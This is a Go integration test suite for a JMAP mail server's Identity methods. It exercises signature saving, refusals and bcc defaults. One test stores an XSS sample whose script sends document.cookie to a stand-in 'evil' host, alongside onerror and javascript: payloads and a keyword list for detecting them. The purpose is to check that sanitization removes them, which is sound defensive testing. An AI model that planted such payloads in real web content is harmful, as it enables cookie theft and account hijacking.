package mail_test

import (
	"encoding/json"
	"fmt"
	"strings"
	"testing"

	"github.com/GrupoNU/moov/internal/jmap"
	"github.com/GrupoNU/moov/internal/jmap/mail"
)

// The Identity end-to-end suite (RFC 8621 §6): the signature save that
// motivated the epic, exercised through the real handlers over a real
// PostgreSQL, with a real account row.
//
// Environment: MOOV_TEST_DATABASE_URL, the same variable every other
// integration suite here uses. Unlike the W1/J3 suites this one needs no IMAP
// connection — an identity is server-side state, never touched on Dovecot —
// so it is gated on the database alone and skips without it.
//
// SAFETY: the fixture creates its OWN throwaway account (newFixture) and
// deletes it on the way out. It never names a pilot mailbox. That matters
// more than usual here because the pilot database holds three accounts that
// belong to real people besides moov-test; this test cannot reach them, by
// construction rather than by care.

// identityCall dispatches one Identity method through the real engine.
//
// It registers its own registry rather than reusing invokeQuery's, because the
// §6 methods are mounted by RegisterIdentityMethods under the submission
// capability — and because going through the ENGINE (rather than calling the
// handler directly) is what makes this an integration test: the capability
// check, the account resolution and the JSON round trip all participate.
func (f *fixture) identityCall(t *testing.T, method, args string) map[string]any {
	t.Helper()

	registry := jmap.NewRegistry()
	mail.RegisterIdentityMethods(registry, f.deps)

	engine := jmap.NewEngine(registry, jmap.DefaultLimits(),
		[]string{jmap.CapCore, jmap.CapMail, jmap.CapSubmission}, nil)

	body := fmt.Sprintf(
		`{"using":["urn:ietf:params:jmap:core","urn:ietf:params:jmap:submission"],`+
			`"methodCalls":[[%q,%s,"c1"]]}`, method, args)

	resp, rerr := engine.Process(f.callerCtx(), []byte(body), "session-identity")
	if rerr != nil {
		t.Fatalf("request-level error: %v", rerr)
	}
	if len(resp.MethodResponses) != 1 {
		t.Fatalf("got %d method responses", len(resp.MethodResponses))
	}
	inv := resp.MethodResponses[0]
	if inv.Name == "error" {
		t.Fatalf("%s failed: %s", method, inv.Args)
	}
	var out map[string]any
	if err := json.Unmarshal(inv.Args, &out); err != nil {
		t.Fatalf("decoding args: %v", err)
	}
	return out
}

func TestVPSIntegrationIdentitySignatureRoundTrip(t *testing.T) {
	f := newFixture(t)
	acct := f.accountID()

	// ---- Identity/get: the account has its identity ------------------------
	//
	// The row comes from EnsureDefaultIdentity via the adapter's self-heal,
	// which is the path every account provisioned after migration 0006 takes.
	got := f.identityCall(t, "Identity/get", fmt.Sprintf(`{"accountId":%q,"ids":null}`, acct))
	list, ok := got["list"].([]any)
	if !ok || len(list) != 1 {
		t.Fatalf("Identity/get returned %v, want exactly one identity", got)
	}
	obj, ok := list[0].(map[string]any)
	if !ok {
		t.Fatalf("identity entry is %T", list[0])
	}
	if obj["id"] != "primary" {
		t.Errorf("id = %v, want the stable \"primary\" alias", obj["id"])
	}
	if obj["email"] != f.account.Email {
		t.Errorf("email = %v, want the account's own address %q", obj["email"], f.account.Email)
	}
	if obj["mayDelete"] != false {
		t.Errorf("mayDelete = %v, want false (§6: the user's own address)", obj["mayDelete"])
	}
	state1, _ := got["state"].(string)
	if state1 == "" {
		t.Fatal("Identity/get returned no state")
	}

	// ---- Identity/set: save a signature ------------------------------------
	//
	// This is the exact operation that answered `forbidden` before this epic
	// and made Bulwark report "Server response was unexpected".
	const textSig = "--\nDiego Nannini\nGrupo NU"
	const htmlSig = `<div>--<br><b>Diego Nannini</b><br><a href="https://gruponu.com">Grupo NU</a></div>`

	setArgs := fmt.Sprintf(`{"accountId":%q,"update":{"primary":{
		"name":%s,"textSignature":%s,"htmlSignature":%s}}}`,
		acct, mustJSON(t, "Diego Nannini"), mustJSON(t, textSig), mustJSON(t, htmlSig))

	set := f.identityCall(t, "Identity/set", setArgs)
	if notUpdated, ok := set["notUpdated"].(map[string]any); ok && len(notUpdated) > 0 {
		t.Fatalf("the signature save was refused: %v", notUpdated)
	}
	updated, ok := set["updated"].(map[string]any)
	if !ok {
		t.Fatalf("Identity/set reported no updates: %v", set)
	}
	if _, ok := updated["primary"]; !ok {
		t.Fatalf("the default identity was not updated: %v", updated)
	}

	// §5.3: oldState/newState bracket the change, and the state MUST move —
	// that is what makes the save visible to the user's other sessions.
	oldState, _ := set["oldState"].(string)
	newState, _ := set["newState"].(string)
	if oldState != state1 {
		t.Errorf("oldState = %q, want the state Identity/get reported (%q)", oldState, state1)
	}
	if newState == oldState {
		t.Fatalf("the identity state did not advance across a save: %q", newState)
	}

	// ---- read it back ------------------------------------------------------
	back := f.identityCall(t, "Identity/get", fmt.Sprintf(`{"accountId":%q,"ids":["primary"]}`, acct))
	blist, _ := back["list"].([]any)
	if len(blist) != 1 {
		t.Fatalf("Identity/get after the save returned %v", back)
	}
	saved, _ := blist[0].(map[string]any)
	if saved["textSignature"] != textSig {
		t.Errorf("textSignature did not round-trip:\n got %q\nwant %q", saved["textSignature"], textSig)
	}
	if saved["name"] != "Diego Nannini" {
		t.Errorf("name = %v", saved["name"])
	}
	savedHTML, _ := saved["htmlSignature"].(string)
	// Sanitized, so not necessarily byte-identical — but the legitimate
	// content and the safe link must survive.
	if !strings.Contains(savedHTML, "Diego Nannini") || !strings.Contains(savedHTML, "gruponu.com") {
		t.Errorf("htmlSignature lost legitimate content: %q", savedHTML)
	}
	if bs, _ := back["state"].(string); bs != newState {
		t.Errorf("Identity/get state %q disagrees with the /set newState %q", bs, newState)
	}

	// ---- Identity/changes reports it ---------------------------------------
	ch := f.identityCall(t, "Identity/changes", fmt.Sprintf(
		`{"accountId":%q,"sinceState":%s}`, acct, mustJSON(t, state1)))
	changed, _ := ch["updated"].([]any)
	if len(changed) != 1 || changed[0] != "primary" {
		t.Errorf("Identity/changes since the pre-save cursor = %v, want [primary]", ch["updated"])
	}
	if ns, _ := ch["newState"].(string); ns != newState {
		t.Errorf("Identity/changes newState = %q, want %q", ns, newState)
	}
}

// The HTML signature is sanitized ON THE WAY IN, so what the database holds —
// and therefore what would be transmitted — is already safe.
func TestVPSIntegrationIdentityHTMLSignatureIsSanitizedInStorage(t *testing.T) {
	f := newFixture(t)
	acct := f.accountID()

	hostile := `<div>Diego<script>fetch('//evil/'+document.cookie)</script>` +
		`<img src=x onerror="alert(1)">` +
		`<a href="javascript:alert(1)">click</a>` +
		`<a href="https://gruponu.com">real</a></div>`

	set := f.identityCall(t, "Identity/set", fmt.Sprintf(
		`{"accountId":%q,"update":{"primary":{"htmlSignature":%s}}}`, acct, mustJSON(t, hostile)))
	if nu, ok := set["notUpdated"].(map[string]any); ok && len(nu) > 0 {
		t.Fatalf("the save was refused: %v", nu)
	}

	// §5.3: the updated map reports "any properties that changed on the server
	// as a side effect" — sanitization is exactly that, so the client learns
	// what was actually kept instead of believing its input round-tripped.
	updated, _ := set["updated"].(map[string]any)
	if entry, ok := updated["primary"].(map[string]any); ok {
		if _, told := entry["htmlSignature"]; !told {
			t.Error("sanitization changed the value but /set did not report htmlSignature back")
		}
	} else {
		t.Error("sanitization changed the value but /set reported null for the update")
	}

	back := f.identityCall(t, "Identity/get", fmt.Sprintf(`{"accountId":%q,"ids":["primary"]}`, acct))
	list, _ := back["list"].([]any)
	obj, _ := list[0].(map[string]any)
	stored, _ := obj["htmlSignature"].(string)

	low := strings.ToLower(stored)
	for _, bad := range []string{"<script", "javascript:", "onerror", "fetch(", "document.cookie"} {
		if strings.Contains(low, bad) {
			t.Errorf("the STORED signature still contains %q: %q", bad, stored)
		}
	}
	// The legitimate parts survive — sanitizing must not mean deleting.
	if !strings.Contains(stored, "Diego") || !strings.Contains(stored, "gruponu.com") {
		t.Errorf("sanitization ate the legitimate content: %q", stored)
	}
}

// The refusals, end to end: what a client actually receives when it asks for
// something §6 does not permit.
func TestVPSIntegrationIdentityRefusals(t *testing.T) {
	f := newFixture(t)
	acct := f.accountID()

	t.Run("email is immutable", func(t *testing.T) {
		resp := f.identityCall(t, "Identity/set", fmt.Sprintf(
			`{"accountId":%q,"update":{"primary":{"email":"someone-else@example.com"}}}`, acct))
		nu, ok := resp["notUpdated"].(map[string]any)
		if !ok {
			t.Fatalf("the immutable email was accepted: %v", resp)
		}
		e, _ := nu["primary"].(map[string]any)
		if e["type"] != "invalidProperties" {
			t.Errorf("type = %v, want invalidProperties (RFC 8620 §5.3)", e["type"])
		}

		// And the address really did not change.
		back := f.identityCall(t, "Identity/get", fmt.Sprintf(`{"accountId":%q,"ids":["primary"]}`, acct))
		list, _ := back["list"].([]any)
		obj, _ := list[0].(map[string]any)
		if obj["email"] != f.account.Email {
			t.Errorf("email changed to %v", obj["email"])
		}
	})

	t.Run("create is refused with forbiddenFrom", func(t *testing.T) {
		resp := f.identityCall(t, "Identity/set", fmt.Sprintf(
			`{"accountId":%q,"create":{"c1":{"email":"alias@example.com","name":"Alias"}}}`, acct))
		nc, ok := resp["notCreated"].(map[string]any)
		if !ok {
			t.Fatalf("an identity was created for an unverified address: %v", resp)
		}
		e, _ := nc["c1"].(map[string]any)
		// §6.3's create-specific SetError, and §9.6's MUST.
		if e["type"] != "forbiddenFrom" {
			t.Errorf("type = %v, want forbiddenFrom (RFC 8621 §6.3)", e["type"])
		}
		if d, _ := e["description"].(string); d == "" {
			t.Error("the refusal carries no description; an opaque refusal is what broke the pilot")
		}
	})

	t.Run("destroy is refused for the default identity", func(t *testing.T) {
		resp := f.identityCall(t, "Identity/set", fmt.Sprintf(
			`{"accountId":%q,"destroy":["primary"]}`, acct))
		nd, ok := resp["notDestroyed"].(map[string]any)
		if !ok {
			t.Fatalf("the account's own identity was destroyed: %v", resp)
		}
		e, _ := nd["primary"].(map[string]any)
		// §6: "Attempts to destroy an Identity with 'mayDelete: false' will be
		// rejected with a standard 'forbidden' SetError."
		if e["type"] != "forbidden" {
			t.Errorf("type = %v, want forbidden (RFC 8621 §6)", e["type"])
		}

		// The identity is still there.
		back := f.identityCall(t, "Identity/get", fmt.Sprintf(`{"accountId":%q,"ids":null}`, acct))
		if list, _ := back["list"].([]any); len(list) != 1 {
			t.Errorf("after a refused destroy the account has %d identities", len(list))
		}
	})
}

// Identity data reaches the submission path: the §9.6 correspondence between
// the identity and the envelope the server derives.
func TestVPSIntegrationIdentityBccReachesTheDerivedEnvelope(t *testing.T) {
	f := newFixture(t)
	acct := f.accountID()

	// Configure a bcc default on the identity (§6: "The Bcc value the client
	// SHOULD set when creating a new Email from this Identity").
	set := f.identityCall(t, "Identity/set", fmt.Sprintf(
		`{"accountId":%q,"update":{"primary":{"bcc":[{"email":"archive@example.test"}]}}}`, acct))
	if nu, ok := set["notUpdated"].(map[string]any); ok && len(nu) > 0 {
		t.Fatalf("configuring bcc was refused: %v", nu)
	}

	back := f.identityCall(t, "Identity/get", fmt.Sprintf(`{"accountId":%q,"ids":["primary"]}`, acct))
	list, _ := back["list"].([]any)
	obj, _ := list[0].(map[string]any)
	raw, err := json.Marshal(obj["bcc"])
	if err != nil {
		t.Fatal(err)
	}
	var bcc []struct {
		Email string `json:"email"`
	}
	if err := json.Unmarshal(raw, &bcc); err != nil {
		t.Fatalf("bcc did not round-trip as an EmailAddress[]: %s", raw)
	}
	if len(bcc) != 1 || bcc[0].Email != "archive@example.test" {
		t.Errorf("bcc = %s, want the configured address", raw)
	}

	// Clearing it back to §6's null must also work — the three-state encoding
	// (absent / null / list) is what makes "remove my bcc default" expressible.
	f.identityCall(t, "Identity/set", fmt.Sprintf(
		`{"accountId":%q,"update":{"primary":{"bcc":null}}}`, acct))
	back = f.identityCall(t, "Identity/get", fmt.Sprintf(`{"accountId":%q,"ids":["primary"]}`, acct))
	list, _ = back["list"].([]any)
	obj, _ = list[0].(map[string]any)
	if obj["bcc"] != nil {
		t.Errorf("bcc = %v after an explicit null, want null (§6 default)", obj["bcc"])
	}
}
